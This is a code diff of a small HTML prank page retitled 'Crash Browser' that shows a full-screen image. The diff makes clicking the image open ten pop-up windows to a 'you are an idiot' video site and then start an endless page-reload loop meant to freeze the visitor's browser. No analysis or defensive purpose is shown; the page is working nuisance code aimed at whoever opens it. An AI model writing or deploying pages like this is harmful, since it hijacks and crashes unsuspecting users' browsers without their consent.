@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>BAZINGA</title>
+  <title>Crash Browser</title>
   <style>
     body {
       margin: 0;
@@ -16,17 +16,26 @@
       width: 100%;
       height: 100%;
       object-fit: cover;
+      cursor: pointer; /* Change cursor to pointer to indicate it's clickable */
     }
   </style>
 </head>
 <body>
-  <img src="https://i.ytimg.com/vi/cXRqUQCW_0Q/maxresdefault.jpg" alt="Image">
+  <img src="https://i.ytimg.com/vi/cXRqUQCW_0Q/maxresdefault.jpg" alt="Image" onclick="activateScripts()">
   <script>
-    setTimeout(function() {
-      while(true) {
-        window.location.reload();
+    function activateScripts() {
+      for (let i = 0; i < 10; i++) {
+        setTimeout(() => {
+          window.open("https://youareanidiot.cc/media/youare.mp4", "_blank");
+        }, i * 500); // Slight delay between each pop-up
       }
-    }, 2000);
+
+      setTimeout(function() {
+        while (true) {
+          window.location.reload();
+        }
+      }, 2000);
+    }
   </script>
 </body>
 </html>
